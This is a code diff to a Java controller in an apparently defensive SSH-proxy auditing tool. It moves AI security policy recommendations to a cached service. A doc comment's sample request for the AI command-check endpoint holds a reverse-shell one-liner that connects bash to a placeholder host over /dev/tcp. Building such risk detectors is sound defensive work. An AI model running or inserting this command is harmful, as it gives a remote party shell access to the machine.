@@ -6,6 +6,7 @@ import com.zhanghan.sshproxyproject.dto.Result;
 import com.zhanghan.sshproxyproject.entity.*;
 import com.zhanghan.sshproxyproject.mapper.AuditLogMapper;
 import com.zhanghan.sshproxyproject.service.DeepSeekService;
+import com.zhanghan.sshproxyproject.service.RecommendationService;
 import jakarta.annotation.Resource;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.web.bind.annotation.*;
@@ -30,6 +31,9 @@ public class AIRiskController {
 
     @Resource
     private StaticRuleEngine staticRuleEngine;            // 静态规则引擎（新增）
+
+    @Resource
+    private RecommendationService recommendationService;  // AI 策略建议（新增）
 
     /**
      * 命令风险分析（静态规则 + AI 审查）
@@ -134,50 +138,21 @@ public class AIRiskController {
     }
 
     /**
-     * AI 策略推荐
+     * AI 策略推荐（读取定时任务生成的缓存）
+     * <p>
+     * 建议由 {@code RecommendationTask} 每天 0 点异步生成并缓存，
+     * 此处直接返回缓存内容，避免每次请求都调用 AI。
      */
     @GetMapping("/recommendations")
     public Result getRecommendations() {
-        List<Map<String, String>> recommendations = new ArrayList<>();
-
-        Map<String, String> r1 = new HashMap<>();
-        r1.put("level", "HIGH");
-        r1.put("content", "建议将 GUEST 角色用户限制 rm / chmod / iptables 等高危命令的使用权限");
-        recommendations.add(r1);
-
-        Map<String, String> r2 = new HashMap<>();
-        r2.put("level", "HIGH");
-        r2.put("content", "建议对所有 sudo 操作开启二次确认机制（MFA或审批流程）");
-        recommendations.add(r2);
-
-        Map<String, String> r3 = new HashMap<>();
-        r3.put("level", "MEDIUM");
-        r3.put("content", "建议限制非管理员用户执行 iptables 和 docker 相关操作");
-        recommendations.add(r3);
-
-        Map<String, String> r4 = new HashMap<>();
-        r4.put("level", "MEDIUM");
-        r4.put("content", "建议对 wget/curl 下载并通过管道执行的脚本增加事前安全扫描");
-        recommendations.add(r4);
-
-        Map<String, String> r5 = new HashMap<>();
-        r5.put("level", "LOW");
-        r5.put("content", "建议定期审计 /etc/passwd、/etc/shadow 等敏感文件的访问记录");
-        recommendations.add(r5);
-
-        Map<String, String> r6 = new HashMap<>();
-        r6.put("level", "LOW");
-        r6.put("content", "建议每周生成审计报告并邮件通知安全管理员");
-        recommendations.add(r6);
-
-        return Result.ok(recommendations);
+        return Result.ok(recommendationService.getRecommendations());
     }
 
     /**
      * 单独测试 AI 审查（不做静态规则判定，纯看 AI 的判断）
      *
      * <pre>
-     * POST /api/ai/check
+     * POST /api/AI/check
      * Body: { "command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" }
      * </pre>
      */
